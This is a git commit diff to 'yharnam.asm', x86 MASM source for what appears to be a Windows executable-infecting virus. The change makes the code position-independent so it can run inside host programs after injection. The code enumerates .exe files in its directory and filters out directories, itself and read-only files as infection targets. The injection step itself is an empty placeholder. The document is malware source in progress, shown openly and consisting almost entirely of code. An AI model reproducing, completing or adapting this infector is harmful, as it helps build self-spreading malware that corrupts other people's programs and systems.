630902794d9910b19ba789cea2c223478146ce5d
Alexandre Paillier <alexandre.paillier@epitech.eu>
2017-02-27 00:20:22 +0100

    Stack offsets now handled with relative addressing

--- yharnam.asm
+++ yharnam.asm
@@ -15,71 +15,103 @@ option casemap:none
       includelib \masm32\lib\kernel32.lib
 
 .data
-	currentExe			DWORD 0
-	fileFilter  		BYTE ".\*.exe",0
-	fileStruct	 		DWORD 0
-	fileSearchHandle	HANDLE 0
-	targetName			DWORD 0
 
 .code
 
 data:
-; offsets to the stack pointer
-	currentExe_			DWORD 0AAAAAAAAh
-	fileFilter_  		DWORD 0BBBBBBBBh
-	fileStruct_	 		DWORD 0CCCCCCCCh;(fileFilter_ + (sizeof BYTE) * 8) ; ".\*.exe"
-	fileSearchHandle_	DWORD 0DDDDDDDDh;(fileStruct_ + sizeof WIN32_FIND_DATA)
-	targetName_			DWORD 0EEEEEEEEh;(fileSearchHandle_ + sizeof HANDLE)
+	fileFilter  		BYTE ".\*.exe",0
 	returnAddr			DWORD 000000000h
+	stackSize			DWORD ((sizeof BYTE * MAX_PATH * 2) + \
+							  sizeof WIN32_FIND_DATA + \
+							  sizeof HANDLE)
+; offsets to the stack pointer
+	currentExe			DWORD 0
+	targetName			DWORD (sizeof BYTE * MAX_PATH)
+	fileStruct	 		DWORD (sizeof BYTE * MAX_PATH * 2)
+	fileSearchHandle	DWORD (sizeof BYTE * MAX_PATH * 2 + sizeof WIN32_FIND_DATA)
 
 start:
 	call _getAddr_ ; get the injected .exe's environment instruction pointer
 _getAddr_:
 	pop ebx
+	; ebx holds "data section" address
 	; (call instruction + (start label address - data label instruction))
 	sub ebx, (5 + (start - data))
 
-	sub esp, MAX_PATH ; allocate on the stack for two strings of size MAX_PATH each
-	mov currentExe, esp
-	sub esp, MAX_PATH
-	mov targetName, esp
-	sub esp, sizeof WIN32_FIND_DATA  ; and for a WIN32_FIND_DATA struct
-	mov fileStruct, esp
+	sub esp, [ebx + (stackSize - data)]
 
-	invoke GetModuleFileName, NULL, currentExe, MAX_PATH ; get current .exe full file path
-	invoke FindFirstFile, offset fileFilter, fileStruct	
+	mov edx, esp
+	push MAX_PATH
+	add edx, [ebx + (currentExe - data)]
+	push edx
+	push NULL
+	call GetModuleFileName ; get current .exe full file path
+
+	mov edx, esp
+	add edx, [ebx + (fileStruct - data)]
+	push edx
+	mov edx, ebx
+	add edx, (fileFilter - data)
+	push edx
+	call FindFirstFile
+
 	cmp eax, INVALID_HANDLE_VALUE
 	je loop_find_file_end
-	mov fileSearchHandle, eax
+
+	mov edx, esp
+	add edx, [ebx + (fileSearchHandle - data)]
+	mov [edx], eax
 loop_find_file:
 	; check file and put it on the stack if needed
-	mov eax, [fileStruct]
-	add eax, (fileStruct.WIN32_FIND_DATA.cFileName - fileStruct.WIN32_FIND_DATA)
-	invoke GetFullPathName, eax, MAX_PATH, targetName, NULL ; get absolute file path
+	mov eax, esp ; save stack "base" address
+	push NULL
+	mov edx, eax
+	add edx, [ebx + (targetName - data)]
+	push edx
+	push MAX_PATH
+	mov edx, eax
+	add edx, [ebx + (fileStruct - data)]
+	add edx, (fileStruct.WIN32_FIND_DATA.cFileName - fileStruct.WIN32_FIND_DATA)
+	push edx
+	call GetFullPathName ; get absolute file path
 	
-	mov eax, [fileStruct]  ; check if it's a directory
-	add eax, (fileStruct.WIN32_FIND_DATA.dwFileAttributes - fileStruct.WIN32_FIND_DATA)
-	mov eax, [eax]
-	and eax, FILE_ATTRIBUTE_DIRECTORY
-	cmp eax, FILE_ATTRIBUTE_DIRECTORY
+	mov edx, esp ; check if it's a directory
+	add edx, [ebx + (fileStruct - data)]
+	mov edx, [edx + (fileStruct.WIN32_FIND_DATA.dwFileAttributes - fileStruct.WIN32_FIND_DATA)]
+	and edx, FILE_ATTRIBUTE_DIRECTORY
+	cmp edx, FILE_ATTRIBUTE_DIRECTORY
 	je loop_find_file_skip
 
-	invoke lstrcmp, currentExe, targetName ; check if this is the program
+	mov eax, esp
+	mov edx, eax
+	add edx, [ebx + (targetName - data)]
+	push edx
+	mov edx, eax
+	add edx, [ebx + (currentExe - data)]
+	push edx
+	call lstrcmp ; check if this is the program
 	cmp eax, 0
 	je loop_find_file_skip
 
-	mov eax, [fileStruct] ; check if it's a read-only file
-	add eax, (fileStruct.WIN32_FIND_DATA.dwFileAttributes - fileStruct.WIN32_FIND_DATA)
-	mov eax, [eax]
-	and eax, FILE_ATTRIBUTE_READONLY
-	cmp eax, FILE_ATTRIBUTE_READONLY
+	mov edx, esp ; check if it's a read-only file
+	add edx, [ebx + (fileStruct - data)]
+	mov edx, [edx + (fileStruct.WIN32_FIND_DATA.dwFileAttributes - fileStruct.WIN32_FIND_DATA)]
+	and edx, FILE_ATTRIBUTE_READONLY
+	cmp edx, FILE_ATTRIBUTE_READONLY
 	je loop_find_file_skip
 
 ;	injection
 ;
 
 loop_find_file_skip:
-	invoke FindNextFile, DWORD ptr ds:[fileSearchHandle], fileStruct	
+	mov eax, esp
+	mov edx, eax
+	add edx, [ebx + (fileStruct - data)]
+	push edx
+	mov edx, eax
+	add edx, [ebx + (fileSearchHandle - data)]
+	push [edx]
+	call FindNextFile
 	cmp eax, TRUE
 	je loop_find_file
 loop_find_file_end:
